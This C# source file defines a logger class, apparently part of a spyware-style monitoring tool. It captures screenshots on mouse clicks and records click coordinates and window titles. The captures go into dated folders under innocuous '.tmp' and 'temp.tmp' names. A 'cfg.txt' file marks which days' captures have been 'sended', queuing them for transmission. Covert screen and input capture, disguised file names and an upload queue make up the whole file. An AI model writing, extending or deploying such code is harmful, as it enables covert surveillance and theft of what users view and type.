using System;
using System.Drawing;
using System.IO;
using System.Xml;

namespace Dragonfly.Chalk
{
    internal static class Logger
    {
        private static string sLogFilePath = string.Empty;

        public static string LogFilePath
        {
            set
            {
                sLogFilePath = value;
                if (!(sLogFilePath.EndsWith("\\") || sLogFilePath.EndsWith("/")))
                    sLogFilePath += Path.DirectorySeparatorChar;
            }
            get
            {
                return sLogFilePath;
            }
        }

        private static string CurrentLogPath
        {
            get
            {
                if (string.IsNullOrEmpty(sLogFilePath))
                    return string.Empty;

                System.DateTime dt = DateTime.Now;
                string sDate = dt.ToString("yyyyMMdd");
                string appPath = LogFilePath + sDate + Path.DirectorySeparatorChar;

                if (!Directory.Exists(appPath))
                {
                    if (FileUtils.CreateDirectory(appPath))
                    {
                        ConfigAddNewPath(sDate);
                        return appPath;
                    }
                    else
                        return string.Empty;
                }
                else
                {
                    return appPath;
                }
            }
        }
        private static string TextLogFilename
        {
            get
            {
                return "temp.tmp";
            }
        }
        private static string PictureFilename
        {
            get
            {
                System.DateTime dt = DateTime.Now;
                string time = dt.ToString("HHmmss");
                return time + ".tmp";
            }
        }



        public static bool log(string message, string titleAndFileName)
        {
            string logPath = CurrentLogPath;
            if (string.IsNullOrEmpty(logPath))
                return false;

            return TextLogger.WriteLog(logPath + TextLogFilename,message, titleAndFileName,false);

        }


        public static bool logScreen()
        {
            string logPath = CurrentLogPath;
            if (string.IsNullOrEmpty(logPath))
                return false;
            string logFile = PictureFilename;
            return ScreenLogger.DrawScreen(logPath + logFile,false);
        }

        public static bool logScreen(Point point, int clicks, string titleAndFileName)
        {
            string logPath = Logger.CurrentLogPath;
            if (string.IsNullOrEmpty(logPath))
                return false;
            string logFile = System.Guid.NewGuid().ToString();
            if (ScreenLogger.DrawScreen(logPath + logFile, point, false))
            {
                string message = string.Format("({0},{1})[{2}]({3})", point.X, point.Y, clicks, logFile);
                return TextLogger.WriteLog(logPath + TextLogFilename, message, titleAndFileName, false);
            }
            else
            {
                return false;
            }
        }



        private static string ConfigFilename
        {
            get
            {
                return "cfg.txt";
            }
        }

        public static string ConfigNextNeedToSendPath()
        {
            XmlDocument xmlDocument = XmlHelper.Load(LogFilePath + ConfigFilename);
            if (xmlDocument == null)
            {
                return string.Empty;
            }

            System.DateTime dt = DateTime.Now;
            string sDate = dt.ToString("yyyyMMdd");

            string sPath = string.Empty;
            XmlNodeList xmlNodelist = xmlDocument.SelectNodes("/Logs/log");
            foreach (XmlNode xmlNode in xmlNodelist)
            {
                bool bSended = XmlHelper.GetParamValue(xmlNode, "sended", false);
                if (!bSended)
                {
                    string sTemp = XmlHelper.GetParamValue(xmlNode, "path", string.Empty);
                    if (!sTemp.Equals(sDate))
                    {
                        sPath = sTemp;
                        break;
                    }
                }
            }

            return sPath;
        }

        public static void ConfigSetSendedPathState(string path)
        {
            XmlDocument xmlDocument = XmlHelper.Load(LogFilePath + ConfigFilename);
            if (xmlDocument == null)
            {
                return;
            }

            XmlNodeList xmlNodelist = xmlDocument.SelectNodes("/Logs/log");
            foreach (XmlNode xmlNode in xmlNodelist)
            {
                string sPath = XmlHelper.GetParamValue(xmlNode, "path", string.Empty);
                if (sPath.Equals(path))
                {
                    XmlHelper.PutParamValue(xmlNode, "sended", true);
                    break;
                }
            }
            xmlDocument.Save(LogFilePath + ConfigFilename);
        }

        private static void ConfigAddNewPath(string path)
        {
            XmlDocument xmlDocument = XmlHelper.Load(LogFilePath + ConfigFilename);
            if (xmlDocument == null)
            {
                xmlDocument = new XmlDocument();
                XmlDeclaration xmldecl = xmlDocument.CreateXmlDeclaration("1.0", "UTF-8", null);
                XmlElement root = xmlDocument.DocumentElement;
                xmlDocument.AppendChild(xmldecl);

                XmlNode node = xmlDocument.CreateNode("element", "Logs", "");
                xmlDocument.AppendChild(node);
            }

            bool bFounded = false;
            XmlNodeList xmlNodelist = xmlDocument.SelectNodes("/Logs/log");
            foreach (XmlNode xmlNode in xmlNodelist)
            {
                string sPath = XmlHelper.GetParamValue(xmlNode, "path", string.Empty);
                if (sPath.Equals(path))
                {
                    bFounded = true;
                    break;
                }
            }

            if (!bFounded)
            {
                XmlNode xmlRoot = xmlDocument.SelectSingleNode("/Logs");
                XmlNode xmlNode = xmlDocument.CreateNode("element", "log", "");
                XmlHelper.PutParamValue(xmlNode, "path", path);
                xmlRoot.AppendChild(xmlNode);
                xmlDocument.Save(LogFilePath + ConfigFilename);
            }
        }

    }
}
